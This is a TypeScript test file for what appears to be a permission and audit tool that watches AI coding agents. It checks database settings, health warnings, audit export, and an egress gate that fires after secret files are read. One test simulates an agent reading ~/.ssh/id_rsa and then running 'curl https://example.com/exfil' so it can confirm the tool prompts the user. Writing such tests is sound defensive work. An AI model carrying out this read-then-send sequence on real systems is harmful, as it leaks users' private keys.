import { copyFileSync, existsSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { DatabaseSync } from "node:sqlite";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { insertEvents, listHistory, openHistoryDb } from "../../src/helper/historyDb";
import { handlePayload } from "../../src/hook/handle";
import { pruneOldDecisions } from "../../src/hook/sweep";
import { DECISION_RETENTION_MS, leashDir } from "../../src/shared/constants";
import {
  checkpointGrantsDb,
  clearHealthWarning,
  exportAuditData,
  getHealthWarning,
  getSetting,
  listDecisions,
  openDb,
  openGrantsDb,
  pruneDecisions,
  readSecretSince,
  recordDecision,
  recordHealthWarning,
  recordSecretTouch,
  setAutoAcceptMode,
  setSetting,
} from "../../src/shared/db";

describe("WP1: decision log root-cause fixes, health warnings, robust afterSecret gate, and audit export", () => {
  let dir: string;
  let home: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "al-wp1-"));
    home = join(dir, "home");
  });

  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  describe("1. openDb / openGrantsDb busy_timeout, WAL checkpointing, and clock-skew safe pruning", () => {
    it("sets PRAGMA busy_timeout = 5000 and WAL mode on openGrantsDb / openDb", () => {
      const dbPath = join(dir, "grants.db");
      const db = openDb(dbPath);
      const timeoutRow = db.prepare("PRAGMA busy_timeout").get() as { timeout: number };
      const journalRow = db.prepare("PRAGMA journal_mode").get() as { journal_mode: string };
      expect(timeoutRow.timeout).toBe(5000);
      expect(journalRow.journal_mode.toLowerCase()).toBe("wal");
      db.close();
    });

    it("checkpoints WAL into grants.db so a raw file copy retains decisions even while another connection is open", () => {
      const dbPath = join(dir, "grants.db");
      const appConn = openGrantsDb(dbPath);
      const hookConn = openGrantsDb(dbPath);

      recordDecision(hookConn, {
        ts: 1_700_000_000_000,
        agent: "antigravity",
        tool: "run_command",
        paths: ["/tmp/a"],
        verdict: "pass",
        command: "ls /tmp/a",
      });
      checkpointGrantsDb(hookConn);
      hookConn.close();

      // Copy ONLY the .db file (simulating `cp ~/.agentic-leash/grants.db`) while appConn is still open
      const rawCopyPath = join(dir, "grants-raw-copy.db");
      copyFileSync(dbPath, rawCopyPath);

      const copyDb = openGrantsDb(rawCopyPath);
      const decisions = listDecisions(copyDb);
      expect(decisions).toHaveLength(1);
      expect(decisions[0]?.command).toBe("ls /tmp/a");

      copyDb.close();
      appConn.close();
    });

    it("guards pruneDecisions and pruneOldDecisions against invalid timestamps and forward clock jumps", () => {
      const dbPath = join(dir, "grants.db");
      const db = openGrantsDb(dbPath);
      const baseNow = new Date("2026-11-06T10:16:00Z").getTime();

      recordDecision(db, {
        ts: baseNow - 1000,
        agent: "antigravity",
        tool: "read_file",
        paths: ["/tmp/x"],
        verdict: "pass",
      });

      // Invalid / negative cutoffs must never delete rows
      expect(pruneDecisions(db, 0)).toBe(0);
      expect(pruneDecisions(db, -500)).toBe(0);
      expect(pruneDecisions(db, Number.NaN)).toBe(0);
      expect(pruneOldDecisions(db, 0)).toBe(0);
      expect(listDecisions(db)).toHaveLength(1);

      // Simulate last_sweep at baseNow, then a sudden >30-day forward clock jump in a single sweep
      setSetting(db, "last_sweep", new Date(baseNow).toISOString());
      const jumpedNow = baseNow + DECISION_RETENTION_MS * 2;
      pruneOldDecisions(db, jumpedNow);

      // Recent decision relative to last_sweep must not be wiped by a single clock jump
      expect(listDecisions(db)).toHaveLength(1);
      db.close();
    });
  });

  describe("2. Health warning recording and fallback on DB write failure", () => {
    it("records and clears health warnings in settings and fallback health.json", () => {
      const dbPath = join(dir, "grants.db");
      const db = openGrantsDb(dbPath);

      expect(getHealthWarning(db, home)).toBeNull();

      recordHealthWarning(db, { ts: 12345, message: "Decision log write failed: database is locked" }, home);
      expect(getHealthWarning(db, home)).toEqual({
        ts: 12345,
        message: "Decision log write failed: database is locked",
      });
      expect(getSetting(db, "health_warning")).toContain("Decision log write failed");
      expect(existsSync(join(leashDir(home), "health.json"))).toBe(true);

      clearHealthWarning(db, home);
      expect(getHealthWarning(db, home)).toBeNull();
      expect(getSetting(db, "health_warning")).toBe("");
      expect(existsSync(join(leashDir(home), "health.json"))).toBe(false);
      db.close();
    });

    it("never fails the tool call when recordDecision throws, and records a health warning", async () => {
      const dbPath = join(dir, "grants.db");
      const db = openGrantsDb(dbPath);
      setAutoAcceptMode(db, Date.now() + 60_000, "*");

      // Break the decisions table so recordDecision throws while handlePayload runs
      db.exec("DROP TABLE decisions");

      const now = 1_700_000_050_000;
      const result = await handlePayload({
        entry: "antigravity",
        raw: {
          conversationId: "s-err",
          workspacePaths: ["/Users/test/proj"],
          toolCall: { name: "read_file", args: { Path: "/Users/test/proj/README.md" } },
        },
        db,
        now,
        home,
        historyPath: join(dir, "history.db"),
        ask: async () => "deny",
      });

      expect(result.exitCode).toBe(0);
      expect(JSON.parse(result.stdout)).toEqual({ decision: "allow" });

      const warning = getHealthWarning(db, home);
      expect(warning).not.toBeNull();
      expect(warning?.ts).toBe(now);
      expect(warning?.message).toMatch(/decision/i);
      db.close();
    });

    it("falls back to health.json in leashDir(home) when the database itself is read-only", async () => {
      const dbPath = join(dir, "grants.db");
      const setupDb = openGrantsDb(dbPath);
      setAutoAcceptMode(setupDb, Date.now() + 60_000, "*");
      setupDb.close();

      const roDb = new DatabaseSync(dbPath, { readOnly: true });
      const now = 1_700_000_060_000;
      const result = await handlePayload({
        entry: "antigravity",
        raw: {
          conversationId: "s-ro",
          workspacePaths: ["/Users/test/proj"],
          toolCall: { name: "read_file", args: { Path: "/Users/test/proj/README.md" } },
        },
        db: roDb,
        now,
        home,
        historyPath: join(dir, "history.db"),
        ask: async () => "deny",
      });

      expect(result.exitCode).toBe(0);
      const warning = getHealthWarning(roDb, home);
      expect(warning).not.toBeNull();
      expect(warning?.ts).toBe(now);
      expect(existsSync(join(leashDir(home), "health.json"))).toBe(true);
      roDb.close();
    });
  });

  describe("3. Robust afterSecret egress gate independent of decisions table", () => {
    it("tracks secret touches in secret_touches and history.db even when decisions is empty", () => {
      const dbPath = join(dir, "grants.db");
      const db = openGrantsDb(dbPath);

      recordSecretTouch(db, { agent: "claude-code", sessionId: "sess-1", ts: 10_000 });
      expect(listDecisions(db)).toHaveLength(0);
      expect(readSecretSince(db, "claude-code", "sess-1", 5_000)).toBe(true);
      expect(readSecretSince(db, "claude-code", "sess-2", 5_000)).toBe(false);
      expect(readSecretSince(db, "claude-code", undefined, 5_000)).toBe(true);
      expect(readSecretSince(db, "claude-code", "sess-1", 15_000)).toBe(false);
      db.close();
    });

    it("falls back to history.db sensitive events when both decisions and secret_touches are empty", () => {
      const db = openGrantsDb(join(dir, "grants.db"));
      const historyDb = openHistoryDb(join(dir, "history.db"));

      insertEvents(historyDb, [
        {
          ts: 20_000,
          agent: "antigravity",
          pid: 123,
          exe: "read_file",
          kind: "read",
          path: `${home}/.ssh/id_ed25519`,
          destPath: null,
          sensitive: true,
          source: "hook",
        },
      ]);

      expect(readSecretSince(db, "antigravity", "any-session", 15_000, historyDb)).toBe(true);
      expect(readSecretSince(db, "antigravity", "any-session", 25_000, historyDb)).toBe(false);

      historyDb.close();
      db.close();
    });

    it("triggers a prompt on egress within 60s after reading a sensitive file even if recordDecision throws or decisions is empty", async () => {
      const db = openGrantsDb(join(dir, "grants.db"));
      const historyPath = join(dir, "history.db");
      const now = 1_700_000_100_000;
      setAutoAcceptMode(db, now + 300_000, "*");

      // Drop decisions table so recordDecision throws on the secret read
      db.exec("DROP TABLE decisions");

      // Step 1: Agent reads a sensitive file (~/.ssh/id_rsa), user allows the prompt
      let secretPrompted = false;
      const readRes = await handlePayload({
        entry: "claude",
        raw: {
          hook_event_name: "PreToolUse",
          tool_name: "Read",
          tool_input: { file_path: `${home}/.ssh/id_rsa` },
          cwd: `${home}/proj`,
          session_id: "sess-egress",
        },
        db,
        historyPath,
        now,
        home,
        ask: async () => {
          secretPrompted = true;
          return "allow";
        },
      });
      expect(secretPrompted).toBe(true);
      expect(readRes.exitCode).toBe(0);

      // Step 2: Within 60s (now + 30_000), agent makes an egress request (curl) under Auto Accept Mode
      // Even though `decisions` table was dropped (and recordDecision threw), afterSecret must still fire and prompt!
      let egressPrompted = false;
      await handlePayload({
        entry: "claude",
        raw: {
          hook_event_name: "PreToolUse",
          tool_name: "Bash",
          tool_input: { command: "curl https://example.com/exfil" },
          cwd: `${home}/proj`,
          session_id: "sess-egress",
        },
        db,
        historyPath,
        now: now + 30_000,
        home,
        ask: async (req) => {
          egressPrompted = Boolean(req.afterSecret);
          return "deny";
        },
      });

      expect(egressPrompted).toBe(true);
      db.close();
    });
  });

  describe("4. exportAuditData SQLite snapshot export using VACUUM INTO", () => {
    it("exports consistent standalone snapshots of grants.db, history.db, and history-user.db", () => {
      const grantsPath = join(dir, "grants.db");
      const sysHistoryPath = join(dir, "sys-history.db");
      const userHistoryPath = join(dir, "user-history.db");
      const exportDir = join(dir, "audit-export");

      const gDb = openGrantsDb(grantsPath);
      recordDecision(gDb, {
        ts: 1_700_000_200_000,
        agent: "antigravity",
        tool: "run_command",
        paths: ["/tmp/test"],
        verdict: "pass",
        command: "echo hello",
      });

      const sysH = openHistoryDb(sysHistoryPath);
      insertEvents(sysH, [
        {
          ts: 1_700_000_200_000,
          agent: "antigravity",
          pid: 10,
          exe: "/bin/ls",
          kind: "read",
          path: "/Users/test/proj/a.ts",
          destPath: null,
          sensitive: false,
          source: "eslogger",
        },
      ]);

      const userH = openHistoryDb(userHistoryPath);
      insertEvents(userH, [
        {
          ts: 1_700_000_201_000,
          agent: "antigravity",
          pid: 11,
          exe: "read_file",
          kind: "read",
          path: "/Users/test/proj/b.ts",
          destPath: null,
          sensitive: false,
          source: "hook",
        },
      ]);

      // Export while all 3 DB connections are still open (with active WAL state)
      const result = exportAuditData({
        targetDir: exportDir,
        grantsPath,
        historyPath: sysHistoryPath,
        userHistoryPath,
      });

      expect(result.ok).toBe(true);
      expect(result.exportDir).toBe(exportDir);
      expect(result.files).toEqual([
        join(exportDir, "grants.db"),
        join(exportDir, "history.db"),
        join(exportDir, "history-user.db"),
      ]);

      const expGrants = openGrantsDb(join(exportDir, "grants.db"));
      expect(listDecisions(expGrants)).toHaveLength(1);
      expect(listDecisions(expGrants)[0]?.command).toBe("echo hello");
      expGrants.close();

      const expSysH = openHistoryDb(join(exportDir, "history.db"), true);
      expect(listHistory(expSysH)).toHaveLength(1);
      expect(listHistory(expSysH)[0]?.path).toBe("/Users/test/proj/a.ts");
      expSysH.close();

      const expUserH = openHistoryDb(join(exportDir, "history-user.db"), true);
      expect(listHistory(expUserH)).toHaveLength(1);
      expect(listHistory(expUserH)[0]?.path).toBe("/Users/test/proj/b.ts");
      expUserH.close();

      gDb.close();
      sysH.close();
      userH.close();
    });
  });
});
